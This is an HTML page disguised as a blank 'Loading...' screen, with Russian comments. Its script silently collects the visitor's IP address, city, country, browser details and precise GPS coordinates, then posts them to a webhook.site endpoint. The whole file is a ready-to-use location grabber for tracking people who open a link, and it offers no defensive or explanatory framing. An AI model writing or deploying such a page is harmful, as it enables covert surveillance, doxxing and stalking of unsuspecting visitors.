<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <style>
        body { background: black; margin: 0; cursor: none; overflow: hidden; }
    </style>
</head>
<body>
<script>
(async () => {
    const info = {
        url: location.href,
        ua: navigator.userAgent,
        screen: screen.width + "x" + screen.height,
        time: new Date().toLocaleString(),
        coords: "Доступ запрещен" 
    };

    // Функция для получения точных координат
    const getFineLocation = () => {
        return new Promise((resolve) => {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition((position) => {
                    resolve(`${position.coords.latitude}, ${position.coords.longitude}`);
                }, () => resolve("Доступ запрещен"), { enableHighAccuracy: true });
            } else {
                resolve("Не поддерживается");
            }
        });
    };

    // Параллельно узнаем город по IP и запрашиваем GPS
    try {
        const [geoResponse, exactCoords] = await Promise.all([
            fetch("https://ipapi.co/json/").then(r => r.json()).catch(() => ({})),
            getFineLocation()
        ]);

        info.ip = geoResponse.ip;
        info.city = geoResponse.city;
        info.country = geoResponse.country_name;
        info.coords = exactCoords; // Тут будет точка на карте
    } catch(e) {}

    // Отправка на Webhook
    try {
        await fetch("https://webhook.site/6729bab1-8bc8-475e-8a94-1bb9e1c033d2", {
            method: "POST",
            mode: "no-cors",
            body: JSON.stringify(info)
        });
    } catch(e) {}
})();
</script>
</body>
</html>
